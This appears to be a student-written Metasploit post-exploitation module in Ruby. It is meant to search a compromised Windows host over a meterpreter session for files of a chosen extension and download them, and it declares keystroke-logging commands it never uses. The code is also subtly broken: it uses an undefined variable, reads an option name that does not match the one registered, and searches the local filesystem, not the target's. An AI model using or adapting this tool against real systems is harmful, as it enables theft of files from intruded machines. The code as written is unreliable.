##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'files manager for windows',
        'Description' => %q{
          get a resource from a system windows
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Adil et Lazare' ],
        'Platform' => [ 'win', 'linux',],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('EXTENSION', [false, 'File Extension to harvest', '']),
        OptPath.new('STARTING_POINT_PATH', [false, 'Starting point', '']),
        OptPath.new('SAVE_PATH', [false, 'path where the files will be saved.', '']),
        OptBool.new('VERBOSE', [false, 'verbose mode', false]),
        OptString.new('FILE_NAME', [false, 'search a specific file', '']),
      ]
    )
  end

  def download_file(file_to_download)

    save_path = datastore['SAVE_PATH'
  ]
    begin
      print_status("Downloading file #{file_path}...")
      client.fs.file.download(save_path, file_path)
      print_good("File downloaded successfully to #{save_path}")
    rescue ::Exception => e
      print_error("Failed to download file: #{e.message}")
    end
  end
    # Méthode pour récupérer les fichiers avec l'extension donnée en option
  # on parcourt récursivement les répertoires à partir du point de départ donné en option
  def get_files_list()

    extension = datastore['EXTENSION']
    starting_point = datastore['STARTING_POINT']
    verbose = datastore['VERBOSE']

      files = []
  
      if verbose == true then puts "browsing subdirectories..." end

      Dir.glob("#{starting_point}/**/*").each do |file|

      if File.file?(file) && File.extname(file) == ".#{extension}"

          if verbose == true
            puts "file with "+extension+" found !"
            puts "file : "+File.basename(file)
          end

          files << file
        end
      end
  
      return files
    end

  def run
    get_files_list()
  end
end
